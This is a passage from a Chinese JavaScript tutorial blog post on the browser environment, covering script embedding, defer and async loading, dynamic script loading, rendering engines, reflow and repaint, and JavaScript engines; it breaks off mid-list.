class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/">前端技术</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>评论数:</span><a href="/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/" itemprop="commentCount"></span></a></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><h2 id="浏览器环境概述"><a href="#浏览器环境概述" class="headerlink" title="浏览器环境概述"></a>浏览器环境概述</h2><p>JavaScript 是浏览器的内置脚本语言。也就是说，浏览器内置了 JavaScript 引擎，并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦网页内嵌了 JavaScript 脚本，浏览器加载网页，就会去执行脚本，从而达到操作浏览器的目的，实现网页的各种动态效果。</p>
<p>本章开始介绍浏览器提供的各种 JavaScript 接口。首先，介绍 JavaScript 代码嵌入网页的方法。</p>
<h3 id="代码嵌入网页的方法"><a href="#代码嵌入网页的方法" class="headerlink" title="代码嵌入网页的方法"></a>代码嵌入网页的方法</h3><p>网页中嵌入 JavaScript 代码，主要有四种方法。</p>
<ul>
<li><code>&lt; script&gt;</code>元素直接嵌入代码。</li>
<li><code>&lt; script&gt;</code>标签加载外部脚本</li>
<li>事件属性</li>
<li>URL 协议</li>
</ul>
<h4 id="script-元素嵌入代码"><a href="#script-元素嵌入代码" class="headerlink" title="script 元素嵌入代码"></a>script 元素嵌入代码</h4><p>&lt; script &gt;元素内部可以直接写入 JavaScript 代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var x &#x3D; 1 + 5;</span><br><span class="line">  console.log(x);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>&lt; script&gt;标签有一个type属性，用来指定脚本类型。对 JavaScript 脚本来说，type属性可以设为两种值。</p>
<ul>
<li><code>text/javascript</code>：这是默认值，也是历史上一贯设定的值。如果你省略<code>type</code>属性，默认就是这个值。对于老式浏览器，设为这个值比较好。</li>
<li><code>application/javascript</code>：对于较新的浏览器，建议设为这个值。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;application&#x2F;javascript&quot;&gt;</span><br><span class="line">  console.log(&#39;Hello World&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>由于<code>&lt; script&gt;</code>标签默认就是 JavaScript 代码。所以，嵌入 JavaScript 脚本时，<code>type</code>属性可以省略。</p>
<p>如果<code>type</code>属性的值，浏览器不认识，那么它不会执行其中的代码。利用这一点，可以在<code>&lt; script&gt;</code>标签之中嵌入任意的文本内容，只要加上一个浏览器不认识的<code>type</code>属性即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id&#x3D;&quot;mydata&quot; type&#x3D;&quot;x-custom-data&quot;&gt;</span><br><span class="line">  console.log(&#39;Hello World&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>上面的代码，浏览器不会执行，也不会显示它的内容，因为不认识它的<code>type</code>属性。但是，这个<code>&lt; script&gt;</code>节点依然存在于 DOM 之中，可以使用<code>&lt; script&gt;</code>节点的<code>text</code>属性读出它的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#39;mydata&#39;).text</span><br><span class="line">&#x2F;&#x2F;   console.log(&#39;Hello World&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="script-元素加载外部脚本"><a href="#script-元素加载外部脚本" class="headerlink" title="script 元素加载外部脚本"></a>script 元素加载外部脚本</h4><p>&lt; script&gt;标签也可以指定加载外部的脚本文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.example.com&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>如果脚本文件使用了非英语字符，还应该注明字符的编码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script charset&#x3D;&quot;utf-8&quot; src&#x3D;&quot;https:&#x2F;&#x2F;www.example.com&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>所加载的脚本必须是纯的 JavaScript 代码，不能有<code>HTML</code>代码和<code>&lt;script&gt;</code>标签。</p>
<p>加载外部脚本和直接添加代码块，这两种方法不能混用。下面代码的<code>console.log</code>语句直接被忽略。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script charset&#x3D;&quot;utf-8&quot; src&#x3D;&quot;example.js&quot;&gt;</span><br><span class="line">  console.log(&#39;Hello World!&#39;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>为了防止攻击者篡改外部脚本，<code>script</code>标签允许设置一个<code>integrity</code>属性，写入该外部脚本的 Hash 签名，用来验证脚本的一致性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;assets&#x2F;application.js&quot;</span><br><span class="line">  integrity&#x3D;&quot;sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs&#x3D;&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>script</code>标签有一个<code>integrity</code>属性，指定了外部脚本<code>/assets/application.js</code>的 SHA256 签名。一旦有人改了这个脚本，导致 SHA256 签名不匹配，浏览器就会拒绝加载。</p>
<h4 id="事件属性"><a href="#事件属性" class="headerlink" title="事件属性"></a>事件属性</h4><p>网页元素的事件属性（比如<code>onclick</code>和<code>onmouseover</code>），可以写入 JavaScript 代码。当指定事件发生时，就会调用这些代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button id&#x3D;&quot;myBtn&quot; onclick&#x3D;&quot;console.log(this.id)&quot;&gt;点击&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。</p>
<h4 id="URL-协议"><a href="#URL-协议" class="headerlink" title="URL 协议"></a>URL 协议</h4><p>URL 支持<code>javascript:</code>协议，即在 URL 的位置写入代码，使用这个 URL 的时候就会执行 JavaScript 代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:console.log(&#39;Hello&#39;)&quot;&gt;点击&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器的地址栏也可以执行<code>javascript:</code>协议。将<code>javascript:console.log(&#39;Hello&#39;)</code>放入地址栏，按回车键也会执行这段代码。</p>
<p>如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript: new Date().toLocaleTimeString();&quot;&gt;点击&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。</p>
<p>如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript: console.log(new Date().toLocaleTimeString())&quot;&gt;点击&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。</p>
<p><code>javascript:</code>协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的是一个网址，所以<code>javascript:</code>网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上<code>void</code>，或者在脚本最后加上<code>void 0</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript: void new Date().toLocaleTimeString();&quot;&gt;点击&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript: new Date().toLocaleTimeString();void 0;&quot;&gt;点击&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>上面这两种写法，点击链接后，执行代码都不会网页跳转。</p>
<h3 id="script-元素"><a href="#script-元素" class="headerlink" title="script 元素"></a>script 元素</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>浏览器加载 JavaScript 脚本，主要通过<code>&lt;script&gt;</code>元素完成。正常的网页加载流程是这样的。</p>
<ol>
<li>浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。</li>
<li>解析过程中，浏览器发现<code>&lt;script&gt;</code>元素，就暂停解析，把网页渲染的控制权转交给 JavaScript 引擎。</li>
<li>如果<code>&lt;script&gt;</code>元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。</li>
<li>JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。</li>
</ol>
<p>加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。</p>
<p>如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。</p>
<p>为了避免这种情况，较好的做法是将<code>&lt;script&gt;</code>标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。</p>
<p>脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    console.log(document.body.innerHTML);</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码执行时会报错，因为此时<code>document.body</code>元素还未生成。</p>
<p>一种解决方法是设定<code>DOMContentLoaded</code>事件的回调函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    document.addEventListener(</span><br><span class="line">      &#39;DOMContentLoaded&#39;,</span><br><span class="line">      function (event) &#123;</span><br><span class="line">        console.log(document.body.innerHTML);</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，指定<code>DOMContentLoaded</code>事件发生后，才开始执行相关代码。<code>DOMContentLoaded</code>事件只有在 DOM 结构生成之后才会触发。</p>
<p>另一种解决方法是，使用<code>&lt; script&gt;</code>标签的<code>onload</code>属性。当<code>&lt; script&gt;</code>标签指定的外部脚本文件下载和解析完成，会触发一个<code>load</code>事件，可以把所需执行的代码，放在这个事件的回调函数里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;jquery.min.js&quot; onload&#x3D;&quot;console.log(document.body.innerHTML)&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;!-- 其他代码  --&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    console.log(document.body.innerHTML);</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<p>如果有多个<code>script</code>标签，比如下面这样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;a.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;b.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器会同时并行下载<code>a.js</code>和<code>b.js</code>，但是，执行时会保证先执行<code>a.js</code>，然后再执行<code>b.js</code>，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。</p>
<p>解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。</p>
<p>此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。</p>
<h5 id="defer-属性"><a href="#defer-属性" class="headerlink" title="defer 属性"></a>defer 属性</h5><p>为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对<code>&lt;script&gt;</code>元素加入<code>defer</code>属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;a.js&quot; defer&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;b.js&quot; defer&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，只有等到 DOM 加载完成后，才会执行<code>a.js</code>和<code>b.js</code>。</p>
<p><code>defer</code>属性的运行流程如下。</p>
<ol>
<li>浏览器开始解析 HTML 网页。</li>
<li>解析过程中，发现带有<code>defer</code>属性的<code>&lt;script&gt;</code>元素。</li>
<li>浏览器继续往下解析 HTML 网页，同时并行下载<code>&lt;script&gt;</code>元素加载的外部脚本。</li>
<li>浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。</li>
</ol>
<p>有了<code>defer</code>属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在<code>DOMContentLoaded</code>事件触发前执行（即刚刚读取完<code>&lt;/html&gt;</code>标签），而且可以保证执行顺序就是它们在页面上出现的顺序。</p>
<p>对于内置而不是加载外部脚本的<code>script</code>标签，以及动态生成的<code>script</code>标签，<code>defer</code>属性不起作用。另外，使用<code>defer</code>加载的外部脚本不应该使用<code>document.write</code>方法。</p>
<h3 id="async-属性"><a href="#async-属性" class="headerlink" title="async 属性"></a>async 属性</h3><p>解决“阻塞效应”的另一个方法是对<code>&lt;script&gt;</code>元素加入<code>async</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;a.js&quot; async&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;b.js&quot; async&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><code>async</code>属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。</p>
<ol>
<li>浏览器开始解析 HTML 网页。</li>
<li>解析过程中，发现带有<code>async</code>属性的<code>script</code>标签。</li>
<li>浏览器继续往下解析 HTML 网页，同时并行下载<code>&lt;script&gt;</code>标签中的外部脚本。</li>
<li>脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。</li>
<li>脚本执行完毕，浏览器恢复解析 HTML 网页。</li>
</ol>
<p><code>async</code>属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用<code>async</code>属性的脚本文件里面的代码，不应该使用<code>document.write</code>方法。</p>
<p><code>defer</code>属性和<code>async</code>属性到底应该使用哪一个？</p>
<p>一般来说，如果脚本之间没有依赖关系，就使用<code>async</code>属性，如果脚本之间有依赖关系，就使用<code>defer</code>属性。如果同时使用<code>async</code>和<code>defer</code>属性，后者不起作用，浏览器行为由<code>async</code>属性决定。</p>
<h4 id="脚本的动态加载"><a href="#脚本的动态加载" class="headerlink" title="脚本的动态加载"></a>脚本的动态加载</h4><p>&lt; script &gt;元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&#39;a.js&#39;, &#39;b.js&#39;].forEach(function(src) &#123;</span><br><span class="line">  var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  script.src &#x3D; src;</span><br><span class="line">  document.head.appendChild(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这种方法的好处是，动态生成的<code>script</code>标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。</p>
<p>如果想避免这个问题，可以设置async属性为<code>false</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[&#39;a.js&#39;, &#39;b.js&#39;].forEach(function(src) &#123;</span><br><span class="line">  var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  script.src &#x3D; src;</span><br><span class="line">  script.async &#x3D; false;</span><br><span class="line">  document.head.appendChild(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面的代码不会阻塞页面渲染，而且可以保证<code>b.js</code>在<code>a.js</code>后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待<code>b.js</code>执行完成后再执行。</p>
<p>如果想为动态加载的脚本指定回调函数，可以使用下面的写法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function loadScript(src, done) &#123;</span><br><span class="line">  var js &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">  js.src &#x3D; src;</span><br><span class="line">  js.onload &#x3D; function() &#123;</span><br><span class="line">    done();</span><br><span class="line">  &#125;;</span><br><span class="line">  js.onerror &#x3D; function() &#123;</span><br><span class="line">    done(new Error(&#39;Failed to load script &#39; + src));</span><br><span class="line">  &#125;;</span><br><span class="line">  document.head.appendChild(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="加载使用的协议"><a href="#加载使用的协议" class="headerlink" title="加载使用的协议"></a>加载使用的协议</h4><p>如果不指定协议，浏览器默认采用 HTTP 协议下载。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>上面的<code>example.js</code>默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;&#x2F;example.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="浏览器的组成"><a href="#浏览器的组成" class="headerlink" title="浏览器的组成"></a>浏览器的组成</h3><p>浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）。</p>
<h4 id="渲染引擎"><a href="#渲染引擎" class="headerlink" title="渲染引擎"></a>渲染引擎</h4><p>渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。</p>
<p>不同的浏览器有不同的渲染引擎。</p>
<ul>
<li>Firefox：Gecko 引擎</li>
<li>Safari：WebKit 引擎</li>
<li>Chrome：Blink 引擎</li>
<li>IE: Trident 引擎</li>
<li>Edge: EdgeHTML 引擎</li>
</ul>
<p>渲染引擎处理网页，通常分成四个阶段。</p>
<ol>
<li>解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。</li>
<li>对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。</li>
<li>布局：计算出渲染树的布局（layout）。</li>
<li>绘制：将渲染树绘制到屏幕。</li>
</ol>
<p>以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。</p>
<h4 id="重流和重绘"><a href="#重流和重绘" class="headerlink" title="重流和重绘"></a>重流和重绘</h4><p>渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。</p>
<p>页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（<code>a:hover</code>）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。</p>
<p>重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。</p>
<p>大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。</p>
<p>作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘<code>table</code>布局和<code>flex</code>布局，开销都会比较大。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var foo &#x3D; document.getElementById(&#39;foobar&#39;);</span><br><span class="line"></span><br><span class="line">foo.style.color &#x3D; &#39;blue&#39;;</span><br><span class="line">foo.style.marginTop &#x3D; &#39;30px&#39;;</span><br></pre></td></tr></table></figure>

<p>上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。</p>
<p>下面是一些优化技巧。</p>
<ul>
<li>读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。</li>
<li>缓存 DOM 信息。</li>
<li>不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。</li>
<li>使用<code>documentFragment</code>操作 DOM</li>
<li>动画使用<code>absolute</code>定位或<code>fixed</code>定位，这样可以减少对其他元素的影响。</li>
<li>只在必要时才显示隐藏元素。</li>
<li>使用<code>window.requestAnimationFrame()</code>，因为它可以把代码推迟到下一次重绘之前执行，而不是立即要求页面重绘。</li>
<li>使用虚拟 DOM（virtual DOM）库。</li>
</ul>
<p>下面是一个<code>window.requestAnimationFrame()</code>对比效果的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 重流代价高</span><br><span class="line">function doubleHeight(element) &#123;</span><br><span class="line">  var currentHeight &#x3D; element.clientHeight;</span><br><span class="line">  element.style.height &#x3D; (currentHeight * 2) + &#39;px&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.forEach(doubleHeight);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 重绘代价低</span><br><span class="line">function doubleHeight(element) &#123;</span><br><span class="line">  var currentHeight &#x3D; element.clientHeight;</span><br><span class="line"></span><br><span class="line">  window.requestAnimationFrame(function () &#123;</span><br><span class="line">    element.style.height &#x3D; (currentHeight * 2) + &#39;px&#39;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.forEach(doubleHeight);</span><br></pre></td></tr></table></figure>

<p>上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。</p>
<h4 id="JavaScript-引擎"><a href="#JavaScript-引擎" class="headerlink" title="JavaScript 引擎"></a>JavaScript 引擎</h4><p>JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。</p>
<p>JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。</p>
<p>为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。</p>
<p>早期，浏览器内部对 JavaScript 的处理过程如下：</p>
<ol>
<li>读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。</li>
<li>对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。</li>
<li>使用“翻译器”（translator），将代码转为字节码（bytecode）。</li>
<li>使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。</li>
</ol>
<p>逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。</p>
<p>字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：</p>
<ul>
